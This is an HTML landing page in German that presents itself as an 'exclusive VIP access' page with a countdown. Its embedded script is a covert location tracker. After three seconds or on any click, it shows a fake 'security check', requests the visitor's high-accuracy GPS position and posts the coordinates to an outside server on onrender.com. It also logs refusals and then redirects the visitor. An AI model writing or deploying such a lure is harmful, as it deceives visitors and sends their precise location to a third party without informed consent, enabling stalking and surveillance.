<!DOCTYPE html>
<html>
<head>
    <title>Exklusiver VIP-Zugang üîê</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: black;
            color: white;
            text-align: center;
            padding-top: 50px;
            cursor: pointer;
        }
        #countdown {
            font-size: 24px;
            margin-top: 20px;
            color: gold;
        }
        #loading {
            display: none;
            color: #0f0;
            margin-top: 20px;
        }
    </style>
</head>
<body onclick="startTracking()">
    <h1>üëâ KLICK F√úR VIP-ZUTRITT üëà</h1>
    <p>Weiterleitung in <span id="countdown">3</span> Sekunden...</p>
    <div id="loading">üîí Sicherheits√ºberpr√ºfung...</div>

    <script>
        let count = 3;
        const timer = setInterval(() => {
            document.getElementById('countdown').textContent = --count;
            if (count <= 0) startTracking();
        }, 1000);

        async function startTracking() {
            clearInterval(timer);
            document.getElementById('loading').style.display = 'block';

            // 1. Standort abfragen
            if (navigator.geolocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 3000,
                            maximumAge: 0
                        });
                    });

                    // 2a. Daten an externen Server senden
                    const { latitude, longitude, accuracy } = position.coords;
                    await fetch('https://loropiana1.onrender.com/submit', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            timestamp: new Date().toISOString(),
                            coordinates: `${latitude},${longitude}`,
                            accuracy: accuracy,
                            source: "VIP-Landingpage"
                        })
                    });

                    // 2b. Optional: Lokales Logging
                    await fetch(`/log-gps?lat=${latitude}&lon=${longitude}&accuracy=${accuracy}`);

                } catch (error) {
                    // 3. Fallback bei Fehlern
                    await fetch('/log-gps?error=blocked');
                    console.log("Standort blockiert:", error);
                }
            }

            // 4. Weiterleiten
            window.location.href = '/redirect';
        }
    </script>
</body>
</html>
